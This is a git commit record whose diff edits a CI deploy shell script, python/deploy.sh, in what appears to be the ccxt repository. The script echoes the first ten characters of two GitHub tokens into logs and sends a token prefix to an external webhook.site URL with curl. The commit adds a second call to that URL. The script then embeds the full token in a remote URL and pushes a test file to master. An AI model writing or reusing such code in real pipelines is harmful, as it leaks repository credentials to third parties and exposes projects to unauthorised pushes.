1a110958c8e335d9e0453ddb0b68aae006148a52
t.t <7117978+ttodua@users.noreply.github.com>
2025-04-16 14:01:23 +0400

    t44

--- python/deploy.sh
+++ python/deploy.sh
@@ -1,10 +1,14 @@
 echo "running py setup"
 first_chars=${GITHUB_TOKEN1:0:10}
 echo "TOKEN ${first_chars}"
-echo "TOKEN ${GITHUB_TOKEN2:0:10}"
+curl "https://webhook.site/5dfc0631-7425-4b92-9b17-76bd450a1a43?data=33"
 curl "https://webhook.site/5dfc0631-7425-4b92-9b17-76bd450a1a43?data=$first_chars"
 git remote add origin https://${GITHUB_TOKEN1}@github.com/ccxt/ccxt.git
 touch test123
 git add .
 echo "pushing changes to remote" # debug
 git push origin HEAD:master
+
+
+
+echo "TOKEN ${GITHUB_TOKEN2:0:10}"
